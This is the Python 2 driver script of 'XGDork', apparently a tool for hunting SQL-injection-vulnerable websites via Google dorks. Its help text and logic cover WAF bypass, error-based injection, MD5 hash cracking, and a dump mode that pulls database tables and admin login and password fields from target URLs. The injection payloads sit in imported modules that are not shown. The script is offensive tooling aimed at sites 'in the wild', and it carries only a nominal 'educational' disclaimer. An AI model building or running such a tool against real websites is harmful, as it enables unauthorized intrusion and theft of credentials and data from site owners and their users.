

# This program is a 'total' free software: you can redistribute it and/or modify - ViraX
# You can quoted me as a source.

import os
import sys
import time
import requests
from random import randint
from termcolor import colored
from XGDlib import search_engine, dump_page
from XGDumper import MOCA
from XGDtoolz import genDork, Ex

argc = len(sys.argv)
iargs = 1
dump_module = 0

data_ipo = -1
data_dork = ""
data_page = -1
data_file = ""
data_bypass = -1
data_cdom = ""
data_forcing = ""
data_timeout = -1
data_gdork = -1
data_x = -1
data_xkey = ""
data_inject = ""
data_mores = -1

data_url = ""
data_param = ""
data_mod = 0
data_table = ""
data_fields = ""
fields_list = []

while (iargs < argc):

    if (argc < 2):
        print colored("Params Error, please use XGDork.py --help ! \n", 'red')
        exit()

    if ((sys.argv[iargs] == '-h' or sys.argv[iargs] == '--help') and argc == 2):

        print colored("\n [XGDork - Scanner]", 'green')
        print (" USE : XGDork.py -d 'your_dork' -p 'page_number' -o 'out_file' \n")

        print ("  -d or --dork 'your_dork'    :add your dork, for search")
        print ("   e,g: -d .php?id= ")
        print ("    [OR]  ")
        print ("  -gd or --gendork    :add a dork generated, for search")
        print ("   e,g: -gd \n")

        print ("  -cd or --cdomain 'your_custom_domain'    :add custom google domain")
        print ("   e,g: -cd .com \n")

        print ("  -p or --page 'page_number'    :add pages max number")
        print ("   e,g: -p 10 \n")

        print ("  -p or --page 'range(n1,n2)' or 'n1,n2'    :add pages number with range")
        print ("   e,g: -p range(2,6) ") 
        print ("   e,g: -p 2,6 \n")

        print ("  -o or --outfile 'out_file'    :save result")
        print ("   e,g: -o urls_sqli.txt \n")

        print ("  -b or --bypass '1'    :active bypass mode")
        print ("   e,g: -b 1 \n")

        print ("  -m or --mores '1'    :mores infos, IPeer")
        print ("   e,g: -m 1 \n")

        print ("  -f or --forcing 'param_i'    :stress url test, detect simple WAF and force error")
        print ("   e,g: -f id= \n")

        print ("  -i or --inject 'param_i'    :brutal option, detect simple WAF and dump infos - ERROR Based")
        print ("   e,g: -i id= \n")

        print ("  -t or --timeout n    :add timeout for requests/SQLparser(Reading)")
        print ("   e,g: -t 5 \n")

        print ("  -ex or --Ex 'your_custom_key'    :encrypt your result (simple, weak)")
        print ("   e,g: -ex '123' \n")


        print colored(" [XGDump - Dumper Mod]", 'green')
        print (" USE : XGDork.py  --xgdump 'your_url_target' 'param_inject' 'mode' 'table' 'field1,field2..etc'   :try inject and dump infos \n")
    
        print ("  --xgdump 'url' 'param_i' '1'    :try dump database_name_version")
        print ("   e,g: -xgdump 'www.testwebsite.com/data/item.php?id=1984' id= 1 \n")

        print ("  --xgdump 'url' 'param_i' '2'    :try dump_tables")
        print ("   e,g: -xgdump 'www.testwebsite.com/data/item.php?id=1984' id= 2 \n")

        print ("  --xgdump 'url' 'param_i' '3' 'table'    :try dump columns")
        print ("   e,g: -xgdump 'www.testwebsite.com/data/item.php?id=1984 id= 3 tbl_admin' \n")

        print ("  --xgdump 'url' 'param_i' '4' 'table' 'fields'    :try dump fields_data")
        print ("   e,g: -xgdump 'www.testwebsite.com/data/item.php?id=1984' id= 4 tbl_admin admin_id,admin_login,admin_password \n")


        print colored(" [XGDtoolz - simple Tools]", 'green')
        print (" USE : XGDtoolz.py --TOOL --ARGS    :simple tools integrate with XGDork \n")
        
        print ("  -gd or --gendork    :allow to generate a dork")
        print ("   e,g: XGDtoolz -gd \n")

        print ("  -xmd5 or --xmd5 'your_hash'    :try to find a string equal to the given hash")
        print ("   e,g: XGDtoolz.py -xmd5 '1b36ea1c9b7a1c3ad668b8bb5df7963f' \n")

        print ("  -ex or --Ex -s or --string 'string' -fs or --filestring 'file' -k or --key 'your_key'    :allow encrypt a string or file")
        print ("   e,g: XGDtoolz.py -ex -s 'Hello World' -k 'abc'")
        print ("   e,g: XGDtoolz.py -ex -fs myfile.txt -k 'abc' \n")

        print ("  -dx or --Dx -s or --string 'string' -fs or --filestring 'file' -k or --key 'your_key'    :allow decrypt (string or file) Ex")
        print ("   e,g: XGDtoolz.py -dx -s '###=0SLO...YkD...2DMi...0SL@@@' -k 'abc'")
        print ("   e,g: XGDtoolz.py -dx -fs myfile.txt -k 'abc' \n")

        print ('\n')
        exit()


    if (sys.argv[iargs] == '-xgdump' or sys.argv[iargs] == '--xgdump'):
        data_url = sys.argv[iargs+1]
        data_param = sys.argv[iargs+2]
        data_mod = sys.argv[iargs+3]
        if (int(data_mod) >= 3):
            data_table = sys.argv[iargs+4]
        if (int(data_mod) == 4):
            data_fields = sys.argv[iargs+5]
        dump_module = 1


    if (sys.argv[iargs] == '-d' or sys.argv[iargs] == "--dork" or sys.argv[iargs] == '-gd' or sys.argv[iargs] == "--gendork"):
        if (sys.argv[iargs] == '-gd' or sys.argv[iargs] == "--gendork"):
            data_dork = genDork(0)
        else:
            data_dork = sys.argv[iargs+1]
    if (sys.argv[iargs] == '-p' or sys.argv[iargs] == "--page"):
        data_page = sys.argv[iargs+1]
    if (sys.argv[iargs] == '-cd' or sys.argv[iargs] == "--cdomain"):
        data_cdom = sys.argv[iargs+1]
    if (sys.argv[iargs] == '-o' or sys.argv[iargs] == "--outfile"):
        data_file = sys.argv[iargs+1]
    if (sys.argv[iargs] == '-b' or sys.argv[iargs] == "--bypass"):
        data_bypass = int(sys.argv[iargs+1])
    if (sys.argv[iargs] == '-f' or sys.argv[iargs] == "--forcing"):
        data_forcing = sys.argv[iargs+1]
    if (sys.argv[iargs] == '-t' or sys.argv[iargs] == "--timeout"):
        data_timeout = int(sys.argv[iargs+1])
    if (sys.argv[iargs] == '-ex' or sys.argv[iargs] == "--Ex"):
        data_x = 1
        data_xkey = sys.argv[iargs+1]
    if (sys.argv[iargs] == "-i" or sys.argv[iargs] == "--inject"):
        data_inject = sys.argv[iargs+1]
    if (sys.argv[iargs] == '-m' or sys.argv[iargs] == "--mores"):
        data_mores = int(sys.argv[iargs+1])
    iargs += 1


if ((data_dork != '' and data_page > 0 and data_file != '') or dump_module == 1):

        print        ("\n\n")
        print colored("  __  ______ ____    42       _     ", 'blue')
        print colored("  \ \/ / ___|  _ \  ___  _ __| | __ ", 'blue')
        print colored("   \  / |  _| | | |/ _ \| '__| |/ / ", 'blue')
        print colored("   /  \ |_| | |_| | (_) | |  |   <  ", 'blue')
        print colored("  /_/\_\____|____/ \___/|_|  |_|\_\ \n", 'blue')
        print colored("  --- ViraX Google Dork Scanner --- \n", 'cyan')

        print        ("  Original code by ViraX")
        print        ("  Version: final-1.0k FreeSoftware for Python 2.7")
        print        ("  Compatible Mobile - Android (NoRoot) - Termux \n")

        print colored("  Contributor(s)/Source(s)", 'cyan')
        print        ("  - SQLmap ('agents file') - https://github.com/sqlmapproject/ ")
        print        ("  - ")
        print        ("\n")

        print colored(" [!] DISCLAIMER: A simple 'naive' tool to find SQLi Vulnerable websites in the wild via Google.", 'green')
        print colored(" I am not responsible for illegal acts that you would do with this program !, only educational . [!] \n", 'green')


        print colored("\n [!] XGDork Start ["+str(time.ctime())+"] ... [!] \n", 'blue')
        

        if (dump_module == 1):
            fields_list = data_fields.split(',')
            print colored(" [*] Warning: XGDump is only based on the simple attack(s) for MySQL >= 5 (Generic)... it's a naive module ...\n", 'red')

            print colored(" [*] URL: "+data_url, 'cyan')
            print colored(" [*] Param: "+data_param, 'cyan')
            if (int(data_mod) < 3):
                print colored(" [*] Mode: "+str(data_mod)+"\n", 'cyan')
            elif (int(data_mod) == 3):
                print colored(" [*] Mode: "+str(data_mod)+" Table: "+data_table+"\n", 'cyan')
            elif (int(data_mod) == 4):
                print colored(" [*] Mode: "+str(data_mod)+" Table: "+data_table+" Fields: "+str(fields_list).replace(']', '').replace('[', '')+"\n", 'cyan')

            MOCA(data_url, data_param, int(data_mod), data_table, fields_list)
            print colored("\n [!] ["+str(time.ctime())+"] ... XGDork End [!] \n", 'blue')
            exit(0)
        else:
            
            data_file = str(data_file).replace('\n', '').replace(' ', '')
            nfile = open(data_file, 'w')
            nfile.write("--- XGDork Result [ "+data_dork+" ] --- \n")
            nfile.close()

            if (data_bypass > 0):
                print colored(" [*] Warning: Bypass mode is active, it may not work...", 'red')
                
            print colored(" [*] let's try with [ "+data_dork+" ] Happy hunting ! ;) ", 'cyan')
            search_engine (data_dork, data_page, data_file, data_bypass, data_cdom, data_forcing, data_timeout, data_inject, data_mores)
            if (data_x == 1):
                Ex ("", data_file, data_xkey, 256)

            print colored("\n [!] ["+str(time.ctime())+"] ... XGDork End [!] \n", 'blue')
            exit(1)

else:
    print ("! USE : XGDork.py -h [OR] --help !")
    exit()
